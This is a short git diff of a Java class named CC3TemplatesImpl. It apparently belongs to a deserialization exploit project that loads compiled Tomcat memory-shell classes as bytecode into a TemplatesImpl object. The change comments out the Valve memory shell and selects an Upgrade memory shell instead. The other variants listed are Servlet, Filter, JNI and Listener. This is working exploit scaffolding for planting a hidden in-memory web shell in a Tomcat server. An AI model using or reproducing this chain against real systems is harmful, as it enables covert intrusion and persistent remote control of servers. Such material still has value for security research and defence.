@@ -21,11 +21,13 @@ import java.util.Map;
 //CC3.2.1
 public class CC3TemplatesImpl {
     public static void main(String[] args) throws Exception {
+//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/servlet/ServletMemShell.class"));
 //        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Generic/GenericTomcatMemShell3.class"));
 //        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Filter/FilterMemShell.class"));
 //        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/JNI/JNIMemShell.class"));
 //        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Listener/ListenerMemShell.class"));
-        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Valve/ValveMemShell2.class"));
+//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Valve/ValveMemShell2.class"));
+        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Upgrade/UpgradeMemShell.class"));
         TemplatesImpl templatesClass = new TemplatesImpl();
         Field[] fields = templatesClass.getClass().getDeclaredFields();
         for (Field field : fields) {
